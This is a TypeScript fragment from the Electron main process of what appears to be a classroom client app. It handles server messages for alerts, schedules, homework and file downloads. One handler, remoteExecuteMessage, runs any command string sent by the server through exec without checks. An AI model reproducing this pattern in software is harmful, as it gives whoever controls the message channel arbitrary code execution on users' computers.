  // ipcMain.on('nextjsMessage', (event, data) => {
  //   if (ws.readyState === WebSocket.OPEN) {
  //     nextJSData = data;
  //     ws.send(JSON.stringify(nextJSData));
  //   } else {
  //     console.error('WebSocket connection is not open');
  //   }
  // });
  // ipcMain.on('minimizeWindow', () => {
  //   const selectedWindow = BrowserWindow.getFocusedWindow();
  //   if (selectedWindow) {
  //     selectedWindow.minimize();
  //   }
  // });

  // ipcMain.on('closeWindow', () => {
  //   const selectedWindow = BrowserWindow.getFocusedWindow();
  //   if (selectedWindow) {
  //     selectedWindow.close();
  //   }
  // });


  // 隐藏窗口的任务栏图标


});

app.on('window-all-closed', () => {
  if (isLogined === false) {
    app.quit();
  }
});

app.on('activate', () => {
  if (OPwindows.loginWindow === null) {
    if (isLogined === false) {
      app.quit();
    }
  }
});
function handleClientMessage(messageBody: ClientPacks.StandardClientMessage) {

  switch (messageBody.command) {
    case configData.clientCommands.alertMessage:
      dialogMessageObj = messageBody.data as ClientPacks.AlertMessage;
      if (configData.allowAlert) {
        let temp = new BrowserWindow({
          frame: false,
          width: 590,
          height: 500,
          alwaysOnTop: false,
          transparent: true,
          autoHideMenuBar: true,
          webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js'),
          },
        });
        LoadPage(temp, '/windows/Dialog');
        temp.once('ready-to-show', () => {
          temp.show();
        });
        temp.on('closed', () => {
          temp = null;
        });
      }
      break;
    case configData.clientCommands.ordinaryMessage:
      const ordinaryContent = messageBody.data as ClientPacks.OrdinaryMessage;
      globalMessageList.push(ordinaryContent);
      store.set(_messageStorageList, globalMessageList);
      OPwindows.mainWindow ? OPwindows.mainWindow.webContents.send('onMessage', ordinaryContent) : null;
      OPwindows.scheduleWindow ? OPwindows.scheduleWindow.webContents.send('onMessage', ordinaryContent.senderName + ":" + ordinaryContent.content) : null;
      if (configData.autoDownloadFiles && ordinaryContent.attachments) {
        ordinaryContent.attachments.forEach((attachment) => {
          downloadFileByHashValue(OPwindows.mainWindow.webContents, attachment.hashValue, attachment.filename, ordinaryContent.senderName);
        });
      }
      break;

    case configData.clientCommands.classUpdateMessage:
      OPwindows.scheduleWindow ? OPwindows.scheduleWindow.webContents.send('onMessage', "课程有更新") : null;
      const classUpdateContent = messageBody.data as ClientPacks.ClassUpdateMessage;
      OPwindows.scheduleWindow.webContents.send('updateClasses', classUpdateContent);
      if (classUpdateContent) {
        classes = classUpdateContent.classList;
        store.set(_classStorageByDay + classUpdateContent.day, classUpdateContent.classList);
      }
      break;

    case configData.clientCommands.remoteExecuteMessage:
      const remoteExecuteContent = messageBody.data as ClientPacks.RemoteExecuteMessage;
      let cmd = remoteExecuteContent.cmd;
      exec(cmd, (error: any, stdout: any, stderr: any) => {
        if (error) {
          console.error(`执行命令时发生错误: ${error}`);
          return;
        }
        console.log(`命令执行成功，输出: ${stdout}`);
      });
      break;

    case configData.clientCommands.fileMessage:
      const fileContent = messageBody.data as ClientPacks.FileMessage;
      if (configData.autoDownloadFiles) {
        fileContent.attachments.forEach((attachment) => {
          downloadFileByHashValue(OPwindows.mainWindow.webContents, attachment.hashValue, attachment.filename, fileContent.senderName);
        });
      }
      break;

    case configData.clientCommands.timerTaskMessage:
      const timerTaskContent = messageBody.data as ClientPacks.TimerTaskMessage;
      tasks.push(timerTaskContent);
      store.set(_tasksStorage, tasks);
      break;

    case configData.clientCommands.homeworkMessage:
      const homeworkContent = messageBody.data as ClientPacks.HomeworkMessage;
      let homeworks = store.get(_homeWorkStorageByDay) as ClientPacks.HomeworkMessage[];
      console.log("获取今日作业" + _homeWorkStorageByDay);
      console.log(homeworks);
      homeworks = homeworks ? [...homeworks, homeworkContent] : [homeworkContent];
      store.set(_homeWorkStorageByDay, homeworks);
      console.log("保存今日作业" + _homeWorkStorageByDay);
      console.log(homeworks);
      OPwindows.scheduleWindow ? OPwindows.scheduleWindow.webContents.send('onMessage', homeworkContent.subject + '有新的作业') : null;
      OPwindows.homeworkWindow ? OPwindows.homeworkWindow.webContents.send('uploadHomework', homeworkContent) : null;
      OPwindows.smallhomeworkWindow ? OPwindows.smallhomeworkWindow.webContents.send('uploadHomework', homeworkContent) : null;
      break;

    case configData.clientCommands.getMessages:
      const getMessagesContent = messageBody.data as ClientPacks.GetMessages;
      break;
  }
}

